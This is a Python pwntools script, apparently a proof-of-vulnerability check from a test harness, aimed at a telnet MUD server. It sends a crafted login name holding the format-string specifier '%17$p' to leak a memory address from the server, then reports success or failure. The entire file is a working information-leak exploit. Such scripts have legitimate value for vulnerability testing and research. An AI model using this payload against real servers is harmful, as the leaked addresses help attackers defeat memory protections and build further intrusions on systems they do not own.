import re
import sys
import os
import signal
import requests as req
from requests.auth import HTTPBasicAuth, HTTPDigestAuth
import base64
import multiprocessing
import time
from pwn import *

go_ahead = b'\xff\xf9'
header = b'\xff\xfc\x01'
footer = b'\xff\xfb\x01\xff'


def handler(signum, frame):
    print('Process timeout.')
    print('[FAILED] POV Failed')
    exit(0)

def recvdata(conn):
    footerfound = False
    recvd = conn.recvuntil(go_ahead, timeout=31)
    if not recvd:
        print("Missing go-ahead: quitting")
        exit()
    if recvd.find(header) >= 0:
        recvd = recvd[recvd.find(header) + 5:]
    if recvd.find(footer) >= 0:
        footerfound = True
        recvd = recvd[:recvd.find(footer)]
    if recvd.find(go_ahead) >= 0 and not footerfound:
        recvd = recvd[:recvd.find(go_ahead)]
    #print(recvd)   
    #print('DIKUMUD3:> ' + recvd.decode('utf-8'))
    return recvd.decode('utf-8')

def senddata(conn, data):
    #print('User:> ' + data)
    conn.sendline(data.encode('utf-8'))

def user_login(conn, username, password):
    conn.recvuntil(b'By what name do they call you?').decode('utf-8')
    senddata(conn, username)
    return recvdata(conn)

def main():
    global HOST
    global PORT 
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)
    print('Host ' + os.environ['HOST'] + ' and PORT: ' + os.environ['PORT'])
    print('Host ' + HOST + ' and PORT: ' + str(PORT))

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(5)

    username = '(' + 'a'*79+ ' %17$p '
    password = ''
    conn = remote(HOST,PORT)
    result = user_login(conn, username, password)
    findaddress=result[(result.find('0x')):result.find(')')]
    if findaddress == "":
        print('[FAILED] POV Failed')
        conn.close()
        exit()
    print('ADDRESS=' + findaddress)
    print('[SUCCESS] POV Succeeded')
    conn.close()


if __name__ == '__main__':
    main()